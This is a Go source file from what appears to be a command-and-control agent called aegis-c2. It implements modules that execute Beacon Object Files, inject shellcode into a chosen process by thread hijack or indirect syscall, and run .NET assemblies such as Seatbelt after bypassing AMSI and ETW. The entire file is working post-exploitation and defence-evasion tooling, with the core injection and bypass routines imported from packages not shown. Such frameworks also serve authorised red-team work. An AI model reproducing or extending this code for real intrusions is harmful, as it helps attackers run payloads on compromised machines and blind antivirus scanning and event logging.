package modules

import (
	"encoding/base64"
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/aegis-c2/aegis/agent/bof"
	"github.com/aegis-c2/aegis/agent/dotnet"
	"github.com/aegis-c2/aegis/agent/loader"
)

// BOFModule 加载并执行 Beacon Object File (COFF)。
// 参数格式: "entry_point coff_file_path" 或 "entry_point base64:data"
// 示例: bof go file.coff 或 bof go base64:TVqQAAMAAAA...
func BOFModule(args string) (string, string, int) {
	if args == "" {
		return "", "usage: bof <entry_point> <coff_file_path|base64:data>", 1
	}

	parts := strings.SplitN(args, " ", 3)
	if len(parts) < 2 {
		return "", "usage: bof <entry_point> <coff_file_path|base64:data>", 1
	}

	entryPoint := parts[0]
	dataArg := parts[1]
	extraArgs := ""
	if len(parts) > 2 {
		extraArgs = parts[2]
	}

	// Load COFF data
	var data []byte
	var err error
	if strings.HasPrefix(dataArg, "base64:") {
		data, err = base64.StdEncoding.DecodeString(dataArg[7:])
		if err != nil {
			return "", fmt.Sprintf("base64 decode error: %v", err), 1
		}
	} else {
		data, err = os.ReadFile(dataArg)
		if err != nil {
			return "", fmt.Sprintf("read file error: %v", err), 1
		}
	}

	var argBytes []byte
	if extraArgs != "" {
		argBytes = []byte(extraArgs)
	}

	stdout, stderr, err := bof.ExecuteBOF(data, entryPoint, argBytes, nil)
	if err != nil {
		return "", fmt.Sprintf("BOF execution failed: %v", err), 1
	}

	var out string
	if len(stdout) > 0 {
		out = string(stdout)
	}
	if len(stderr) > 0 {
		if out != "" {
			out += "\n"
		}
		out += "[stderr] " + string(stderr)
	}
	return out, "", 0
}

// InjectModule 执行进程注入。
// 参数格式: "pid shellcode_path" 或 "pid base64:data"
// 示例: inject 1234 shellcode.bin 或 inject 1234 base64:TVqQAAMAAAA...
func InjectModule(args string) (string, string, int) {
	if args == "" {
		return "", "usage: inject <pid> <shellcode_path|base64:data> [method]", 1
	}

	parts := strings.Fields(args)
	if len(parts) < 2 {
		return "", "usage: inject <pid> <shellcode_path|base64:data> [method]", 1
	}

	pid, err := strconv.Atoi(parts[0])
	if err != nil || pid <= 0 {
		return "", fmt.Sprintf("invalid pid: %s", parts[0]), 1
	}

	dataArg := parts[1]
	var shellcode []byte
	if strings.HasPrefix(dataArg, "base64:") {
		shellcode, err = base64.StdEncoding.DecodeString(dataArg[7:])
		if err != nil {
			return "", fmt.Sprintf("base64 decode error: %v", err), 1
		}
	} else {
		shellcode, err = os.ReadFile(dataArg)
		if err != nil {
			return "", fmt.Sprintf("read file error: %v", err), 1
		}
	}

	cfg := &loader.LoadConfig{
		PID:       pid,
		Shellcode: shellcode,
	}

	// 可选的注入方法: "api", "syscall", "hijack"
	if len(parts) >= 3 {
		switch parts[2] {
		case "syscall":
			cfg.Method = loader.MethodIndirectSyscall
		case "hijack":
			cfg.Method = loader.MethodThreadHijack
		default:
			cfg.Method = loader.MethodWindowsAPI
		}
	}

	result := loader.Load(cfg)
	if !result.Success {
		return "", result.Message, 1
	}

	return result.Message, "", 0
}

// DotNetModule 执行 .NET 程序集。
// 参数格式: "assembly_path [args...] [--inproc] [--amsi] [--etw]"
// 示例: dotnet Seatbelt.exe -group=user --amsi --etw
func DotNetModule(args string) (string, string, int) {
	if args == "" {
		return "", "usage: dotnet <assembly_path> [args...] [--inproc] [--amsi] [--etw]", 1
	}

	// Parse flags from args
	parts := strings.Fields(args)
	var filePath string
	var exeArgs []string
	inProcess := false
	doAMSI := false
	doETW := false

	for i, p := range parts {
		if i == 0 {
			filePath = p
			continue
		}
		switch p {
		case "--inproc":
			inProcess = true
		case "--amsi":
			doAMSI = true
		case "--etw":
			doETW = true
		default:
			exeArgs = append(exeArgs, p)
		}
	}

	if filePath == "" {
		return "", "no assembly path specified", 1
	}

	if _, err := os.Stat(filePath); err != nil {
		return "", fmt.Sprintf("assembly not found: %s (%v)", filePath, err), 1
	}

	config := &dotnet.AssemblyConfig{
		AssemblyPath: filePath,
		ClassName:    "",
		MethodName:   "",
		Args:         exeArgs,
		InProcess:    inProcess,
		AMSI:         doAMSI,
		ETW:          doETW,
	}

	// Apply AMSI/ETW bypass if requested before execution
	if doAMSI {
		ctx, err := dotnet.BypassAMSI()
		if err != nil {
			return "", fmt.Sprintf("AMSI bypass failed: %v", err), 1
		}
		defer ctx.Restore()
	}
	if doETW {
		ctx, err := dotnet.BypassETW()
		if err != nil {
			return "", fmt.Sprintf("ETW bypass failed: %v", err), 1
		}
		defer ctx.Restore()
	}

	var result *dotnet.AssemblyResult
	var execErr error

	if inProcess {
		result, execErr = dotnet.ExecuteInProcess(config)
	} else {
		result, execErr = dotnet.ExecuteOutProcess(config)
	}

	if execErr != nil {
		return "", fmt.Sprintf(".NET execution failed: %v", execErr), 1
	}

	var sb strings.Builder
	if result.Stdout != "" {
		sb.WriteString(result.Stdout)
		sb.WriteString("\n")
	}
	if result.Stderr != "" {
		sb.WriteString("[stderr] ")
		sb.WriteString(result.Stderr)
		sb.WriteString("\n")
	}
	sb.WriteString(fmt.Sprintf("[exit code: %d, duration: %s]", result.ExitCode, result.Duration))

	return sb.String(), "", 0
}
